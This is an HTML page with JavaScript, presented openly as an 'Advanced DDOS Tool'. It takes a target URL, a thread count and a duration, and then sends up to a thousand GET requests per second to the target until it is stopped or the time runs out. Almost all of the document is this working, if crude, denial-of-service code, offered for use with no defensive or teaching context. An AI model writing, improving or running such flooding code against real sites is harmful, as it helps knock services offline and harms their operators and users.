<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced DDOS Tool</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #222;
            color: #eee;
        }

        .container {
            max-width: 400px;
            margin: 0 auto;
            padding: 20px;
            background-color: #333;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        }

        h1 {
            text-align: center;
        }

        .form-group {
            margin-bottom: 10px;
        }

        label {
            display: block;
            margin-bottom: 5px;
        }

        input[type="text"],
        input[type="number"] {
            width: 100%;
            padding: 5px;
            border: 1px solid #555;
            border-radius: 3px;
            background-color: #444;
            color: #eee;
        }

        button {
            padding: 10px 20px;
            background-color: #ff0000;
            color: #fff;
            border: none;
            border-radius: 3px;
            cursor: pointer;
        }

        button:disabled {
            background-color: #555;
            cursor: not-allowed;
        }

        #status {
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Advanced DDOS Tool</h1>
        <div class="form-group">
            <label for="target">Target URL:</label>
            <input type="text" id="target" placeholder="Enter target URL">
        </div>
        <div class="form-group">
            <label for="threads">Number of Threads:</label>
            <input type="number" id="threads" min="1" max="1000" value="100">
        </div>
        <div class="form-group">
            <label for="duration">Duration (seconds):</label>
            <input type="number" id="duration" min="1" max="3600" value="60">
        </div>
        <button id="start">Start Attack</button>
        <button id="stop" disabled>Stop Attack</button>
        <div id="status"></div>
    </div>
    <script>
        const startButton = document.getElementById('start');
        const stopButton = document.getElementById('stop');
        const statusDiv = document.getElementById('status');

        let attackInterval;

        startButton.addEventListener('click', startAttack);
        stopButton.addEventListener('click', stopAttack);

        function startAttack() {
            const target = document.getElementById('target').value;
            const threads = parseInt(document.getElementById('threads').value);
            const duration = parseInt(document.getElementById('duration').value);

            if (!target || !threads || !duration) {
                alert('Please fill in all fields.');
                return;
            }

            startButton.disabled = true;
            stopButton.disabled = false;
            statusDiv.textContent = 'Attack in progress...';

            attackInterval = setInterval(() => {
                for (let i = 0; i < threads; i++) {
                    const xhr = new XMLHttpRequest();
                    xhr.open('GET', target);
                    xhr.send();
                }
            }, 1000);

            setTimeout(() => {
                clearInterval(attackInterval);
                startButton.disabled = false;
                stopButton.disabled = true;
                statusDiv.textContent = 'Attack completed.';
            }, duration * 1000);
        }

        function stopAttack() {
            clearInterval(attackInterval);
            startButton.disabled = false;
            stopButton.disabled = true;
            statusDiv.textContent = 'Attack stopped.';
        }
    </script>
</body>
</html>
